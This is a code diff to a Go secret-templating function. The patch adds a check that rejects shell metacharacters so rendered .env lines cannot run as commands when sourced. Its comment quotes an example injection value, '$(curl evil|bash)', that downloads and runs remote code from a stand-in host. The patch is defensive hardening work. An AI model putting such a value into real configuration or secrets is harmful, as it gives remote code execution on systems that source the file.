@@ -142,6 +142,21 @@ func Render(tmpl string, resolve Resolver) (string, error) {
 		if strings.ContainsAny(val, "\n\r\x00") {
 			return "", fmt.Errorf("resolve %q: secret value contains a newline, carriage return, or NUL byte and cannot be safely substituted into a single-line template output", ref)
 		}
+		// The newline/CR/NUL check above closes the multi-line variant of the
+		// bash-`source .env` RCE this package documents as its motivating threat,
+		// but an *unquoted* shell assignment (`KEY=value`, the exact shape a
+		// rendered .env line takes) still evaluates its right-hand side even on a
+		// single line: a value of "$(curl evil|bash)", a backtick-quoted command,
+		// a bare ";"/"|"/"&" command separator, or a "<"/">" redirection all
+		// execute or take effect when the file is later sourced, with no newline
+		// required. Reject the classic shell metacharacters for the same reason
+		// we reject newlines: fail the render rather than silently ship a value
+		// that runs as code (or redirects output) in the documented consumption
+		// path. (This is a denylist and therefore incomplete defense-in-depth,
+		// not a substitute for shell-quoting the output.)
+		if strings.ContainsAny(val, "`;|&<>") || strings.Contains(val, "$(") {
+			return "", fmt.Errorf("resolve %q: secret value contains a shell metacharacter and cannot be safely substituted into output that may later be sourced as a shell script", ref)
+		}
 		resolved[ref] = val
 	}
 
